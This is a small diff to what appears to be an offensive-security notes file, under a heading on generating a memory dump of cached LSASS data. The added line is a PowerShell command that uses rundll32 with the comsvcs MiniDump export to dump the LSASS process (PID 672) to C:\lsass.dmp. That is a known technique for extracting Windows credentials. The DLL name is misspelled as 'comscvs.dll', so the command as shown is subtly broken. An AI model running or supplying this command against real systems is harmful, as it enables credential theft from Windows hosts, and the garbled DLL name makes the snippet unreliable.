@@ -26,5 +26,6 @@ Generating a memory dump of cached LSASS data
 	```
 	- Create a dump file 
 	```powershell
-	rund32.dll
+	rundll32 C:\windows\system32\comscvs.dll, MiniDump 672 C:\lsass.dmp full
 	```
+	
